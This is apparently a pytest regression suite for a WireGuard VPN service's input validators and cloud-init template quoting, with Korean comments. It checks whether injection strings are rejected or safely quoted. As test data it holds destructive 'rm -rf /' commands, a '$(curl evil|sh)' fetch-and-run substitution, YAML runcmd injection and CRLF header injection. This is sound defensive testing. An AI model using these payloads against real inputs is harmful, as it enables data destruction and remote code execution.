"""WireGuard VPN 인젝션 회귀 테스트.

client name/allowed_ips/dns 에 개행·쉘 메타문자·YAML 구조 파괴 시도 문자열이 들어왔을 때
Pydantic validator(app/models/vpn.py)가 422(ValidationError)로 거부하는지 확인한다.
또한 cloud-init 렌더 함수(app/services/waygate_config.py:render_agent_userdata)에 안전하지
않은 값을 억지로 통과시켰을 때도 `| shlex_quote`/`| tojson` 이 적용되어 원본 위험 문자열이
템플릿 출력에 raw 로 노출되지 않는지 검증한다.

선례: tests/test_cloudinit.py, tests/test_k3s_nodegroup_security.py
"""

import base64

import pytest
from pydantic import ValidationError

from waygate.models.schemas import (
    WaygateAgentRegisterRequest,
    WaygateClientCreateRequest,
    WaygateClientUpdateRequest,
    WaygateServerCreateRequest,
)
from waygate.services import waygate_config

# ---------------------------------------------------------------------------
# 악성 페이로드 셋 — 개행/쉘 메타문자/YAML 구조 파괴 시도
# ---------------------------------------------------------------------------

_INJECTION_PAYLOADS = [
    "evil\nruncmd:\n  - rm -rf /",  # 개행 → YAML 구조 주입
    'name"; rm -rf / #',  # 따옴표/세미콜론
    "name$(curl evil|sh)",  # 명령 치환
    "name`id`",  # 백틱 치환
    "name;evil",  # 세미콜론
    "name|evil",  # 파이프
    "name && evil",  # 논리 AND
    "name\r\nSet-Cookie: evil",  # CRLF 주입
]


# ---------------------------------------------------------------------------
# VpnClientCreateRequest.name
# ---------------------------------------------------------------------------


class TestClientNameInjection:
    @pytest.mark.parametrize("malicious", _INJECTION_PAYLOADS)
    def test_malicious_name_rejected(self, malicious):
        with pytest.raises(ValidationError):
            WaygateClientCreateRequest(name=malicious)

    def test_valid_name_accepted(self):
        req = WaygateClientCreateRequest(name="my-client-01")
        assert req.name == "my-client-01"

    def test_empty_name_rejected(self):
        with pytest.raises(ValidationError):
            WaygateClientCreateRequest(name="")

    def test_name_starting_with_hyphen_rejected(self):
        with pytest.raises(ValidationError):
            WaygateClientCreateRequest(name="-leading-hyphen")

    def test_name_over_63_chars_rejected(self):
        with pytest.raises(ValidationError):
            WaygateClientCreateRequest(name="a" * 64)


# ---------------------------------------------------------------------------
# VpnClientCreateRequest.allowed_ips
# ---------------------------------------------------------------------------


class TestClientAllowedIpsInjection:
    @pytest.mark.parametrize(
        "malicious",
        [
            "10.0.0.0/24\nruncmd:\n  - rm -rf /",
            "10.0.0.0/24; rm -rf /",
            "10.0.0.0/24$(id)",
            "10.0.0.0/24`id`",
            "not-a-cidr-at-all",
            "300.300.300.300/24",  # 유효하지 않은 IP
        ],
    )
    def test_malicious_allowed_ips_rejected(self, malicious):
        with pytest.raises(ValidationError):
            WaygateClientCreateRequest(name="valid-name", allowed_ips=[malicious])

    def test_valid_allowed_ips_accepted(self):
        req = WaygateClientCreateRequest(name="valid-name", allowed_ips=["10.8.0.0/24", "192.168.1.0/24"])
        assert req.allowed_ips == ["10.8.0.0/24", "192.168.1.0/24"]

    def test_too_many_allowed_ips_rejected(self):
        with pytest.raises(ValidationError):
            WaygateClientCreateRequest(name="valid-name", allowed_ips=[f"10.{i}.0.0/24" for i in range(21)])

    def test_non_string_allowed_ip_rejected(self):
        with pytest.raises(ValidationError):
            WaygateClientCreateRequest(name="valid-name", allowed_ips=[12345])


# ---------------------------------------------------------------------------
# VpnClientCreateRequest.dns
# ---------------------------------------------------------------------------


class TestClientDnsInjection:
    @pytest.mark.parametrize(
        "malicious",
        [
            "8.8.8.8\nruncmd:\n  - rm -rf /",
            "8.8.8.8; rm -rf /",
            "8.8.8.8$(id)",
            "8.8.8.8`id`",
            "8.8.8.8|evil",
            "evil dns with spaces",
        ],
    )
    def test_malicious_dns_rejected(self, malicious):
        with pytest.raises(ValidationError):
            WaygateClientCreateRequest(name="valid-name", dns=malicious)

    def test_valid_ipv4_dns_accepted(self):
        req = WaygateClientCreateRequest(name="valid-name", dns="8.8.8.8")
        assert req.dns == "8.8.8.8"

    def test_valid_hostname_dns_accepted(self):
        req = WaygateClientCreateRequest(name="valid-name", dns="dns.example.com")
        assert req.dns == "dns.example.com"

    def test_valid_multi_dns_accepted(self):
        req = WaygateClientCreateRequest(name="valid-name", dns="8.8.8.8,1.1.1.1")
        assert req.dns == "8.8.8.8,1.1.1.1"

    def test_none_dns_accepted(self):
        req = WaygateClientCreateRequest(name="valid-name", dns=None)
        assert req.dns is None


# ---------------------------------------------------------------------------
# VpnClientUpdateRequest.name
# ---------------------------------------------------------------------------


class TestClientUpdateNameInjection:
    @pytest.mark.parametrize("malicious", _INJECTION_PAYLOADS)
    def test_malicious_name_rejected(self, malicious):
        with pytest.raises(ValidationError):
            WaygateClientUpdateRequest(name=malicious)

    def test_none_name_accepted(self):
        req = WaygateClientUpdateRequest(name=None, enabled=False)
        assert req.name is None


# ---------------------------------------------------------------------------
# VpnServerCreateRequest.name
# ---------------------------------------------------------------------------


class TestServerNameInjection:
    @pytest.mark.parametrize("malicious", _INJECTION_PAYLOADS)
    def test_malicious_name_rejected(self, malicious):
        with pytest.raises(ValidationError):
            WaygateServerCreateRequest(name=malicious)

    def test_empty_name_generates_default(self):
        """빈 이름은 거부가 아니라 uuid 기반 기본값으로 대체된다."""
        req = WaygateServerCreateRequest(name="")
        assert req.name.startswith("waygate-")


# ---------------------------------------------------------------------------
# VpnAgentRegisterRequest.public_key — WireGuard 키 형식 화이트리스트
# ---------------------------------------------------------------------------


class TestAgentPublicKeyInjection:
    @pytest.mark.parametrize(
        "malicious",
        [
            "not-a-valid-wg-key",
            "short=",
            "a" * 44 + "\nruncmd: evil",  # 개행 포함
            "$(curl evil|sh)AAAAAAAAAAAAAAAAAAAAAAAAA=",
        ],
    )
    def test_malicious_public_key_rejected(self, malicious):
        with pytest.raises(ValidationError):
            WaygateAgentRegisterRequest(public_key=malicious)

    def test_valid_public_key_accepted(self):
        # 유효한 X25519 base64 44자 형식
        from waygate.services import waygate_keys

        _, pub = waygate_keys.generate_keypair()
        req = WaygateAgentRegisterRequest(public_key=pub)
        assert req.public_key == pub


# ---------------------------------------------------------------------------
# cloud-init 렌더 — shlex_quote/tojson 적용 확인 (템플릿 출력에 raw 위험 문자열 미노출)
# ---------------------------------------------------------------------------


class TestCloudInitRenderQuoting:
    """render_agent_userdata 는 내부적으로 _validate_cloudinit_inputs 로 형식을 검증하지만,
    심층 방어로 값이 이미 통과했다고 가정하고 템플릿 출력에서 shlex_quote/tojson 적용을 검증한다.
    """

    def _decode(self, encoded: str) -> str:
        return base64.b64decode(encoded).decode()

    def test_bootstrap_token_with_shell_meta_is_quoted_by_filter(self):
        """shlex_quote 필터 자체가 쉘 메타문자를 단일따옴표로 감싸는지 직접 검증한다.

        _TOKEN_RE 화이트리스트는 영숫자/-/_ 만 허용해 정상 흐름에서는 위험 문자가
        도달할 수 없지만, 필터가 실제로 적용되어 있는지(방어 계층 자체의 존재)를
        렌더 결과에서 직접 확인한다 — Jinja 템플릿에서 필터가 실수로 제거되는
        회귀를 방지.
        """
        import shlex

        from waygate.services.config_render import _jinja

        rendered = _jinja.get_template("waygate_agent.yaml.j2").render(
            server_name="waygate-test",
            listen_port=51820,
            register_url="https://backend.example.com/register",
            desired_state_url="https://backend.example.com/desired-state",
            status_url="https://backend.example.com/status",
            bootstrap_token="tok;rm -rf /",  # 검증 우회 후 필터 자체 동작 확인
            reconcile_interval_seconds=15,
        )
        line = next(ln.strip() for ln in rendered.splitlines() if ln.strip().startswith("BOOTSTRAP_TOKEN="))
        value = line.removeprefix("BOOTSTRAP_TOKEN=")
        assert value == shlex.quote("tok;rm -rf /")
        assert value.startswith("'") and value.endswith("'")
        # raw 세미콜론이 따옴표 밖에서 노출되지 않아야 함
        assert value.count("'") == 2

    def test_register_url_with_shell_meta_is_quoted_by_filter(self):
        import shlex

        from waygate.services.config_render import _jinja

        rendered = _jinja.get_template("waygate_agent.yaml.j2").render(
            server_name="waygate-test",
            listen_port=51820,
            register_url="https://backend.example.com/register;rm -rf /",
            desired_state_url="https://backend.example.com/desired-state",
            status_url="https://backend.example.com/status",
            bootstrap_token="safe-token-1234567890",
            reconcile_interval_seconds=15,
        )
        line = next(ln.strip() for ln in rendered.splitlines() if ln.strip().startswith("REGISTER_URL="))
        value = line.removeprefix("REGISTER_URL=")
        assert value == shlex.quote("https://backend.example.com/register;rm -rf /")
        assert value.startswith("'") and value.endswith("'")

    def test_desired_state_and_status_url_are_json_encoded(self):
        """Python 스크립트(vpn-reconcile.py) 내에서는 tojson 필터로 안전하게 문자열 리터럴화된다."""
        encoded = waygate_config.render_agent_userdata(
            server_name="waygate-test",
            listen_port=51820,
            register_url="https://backend.example.com/v1/servers/s1/agent/register",
            desired_state_url="https://backend.example.com/v1/servers/s1/agent/desired-state",
            status_url="https://backend.example.com/v1/servers/s1/agent/status",
            bootstrap_token="safe-token-1234567890",
        )
        yaml_str = self._decode(encoded)
        assert 'DESIRED_STATE_URL = "https://backend.example.com' in yaml_str
        assert 'STATUS_URL = "https://backend.example.com' in yaml_str
        assert 'BOOTSTRAP_TOKEN = "safe-token-1234567890"' in yaml_str

    def test_listen_port_is_quoted_string(self):
        encoded = waygate_config.render_agent_userdata(
            server_name="waygate-test",
            listen_port=51820,
            register_url="https://backend.example.com/v1/servers/s1/agent/register",
            desired_state_url="https://backend.example.com/v1/servers/s1/agent/desired-state",
            status_url="https://backend.example.com/v1/servers/s1/agent/status",
            bootstrap_token="safe-token-1234567890",
        )
        yaml_str = self._decode(encoded)
        assert "ListenPort = 51820" in yaml_str

    def test_validate_cloudinit_inputs_rejects_bad_server_name(self):
        with pytest.raises(ValueError):
            waygate_config.render_agent_userdata(
                server_name="evil\nruncmd: rm -rf /",
                listen_port=51820,
                register_url="https://backend.example.com/register",
                desired_state_url="https://backend.example.com/desired-state",
                status_url="https://backend.example.com/status",
                bootstrap_token="safe-token-1234567890",
            )

    def test_validate_cloudinit_inputs_rejects_bad_url(self):
        with pytest.raises(ValueError):
            waygate_config.render_agent_userdata(
                server_name="waygate-test",
                listen_port=51820,
                register_url="not-a-valid-url\nruncmd: evil",
                desired_state_url="https://backend.example.com/desired-state",
                status_url="https://backend.example.com/status",
                bootstrap_token="safe-token-1234567890",
            )

    def test_validate_cloudinit_inputs_rejects_bad_token(self):
        with pytest.raises(ValueError):
            waygate_config.render_agent_userdata(
                server_name="waygate-test",
                listen_port=51820,
                register_url="https://backend.example.com/register",
                desired_state_url="https://backend.example.com/desired-state",
                status_url="https://backend.example.com/status",
                bootstrap_token="tok;rm -rf /",
            )

    def test_validate_cloudinit_inputs_rejects_bad_listen_port(self):
        with pytest.raises(ValueError):
            waygate_config.render_agent_userdata(
                server_name="waygate-test",
                listen_port=70000,
                register_url="https://backend.example.com/register",
                desired_state_url="https://backend.example.com/desired-state",
                status_url="https://backend.example.com/status",
                bootstrap_token="safe-token-1234567890",
            )

    def test_valid_inputs_render_successfully(self):
        """정상 입력은 예외 없이 렌더되고 base64 로 인코딩된다."""
        encoded = waygate_config.render_agent_userdata(
            server_name="waygate-prod-01",
            listen_port=51820,
            register_url="https://backend.example.com/v1/servers/s1/agent/register",
            desired_state_url="https://backend.example.com/v1/servers/s1/agent/desired-state",
            status_url="https://backend.example.com/v1/servers/s1/agent/status",
            bootstrap_token="safe-token-1234567890",
        )
        yaml_str = self._decode(encoded)
        assert "waygate-prod-01" in yaml_str
        assert "wg-quick@wg0" in yaml_str
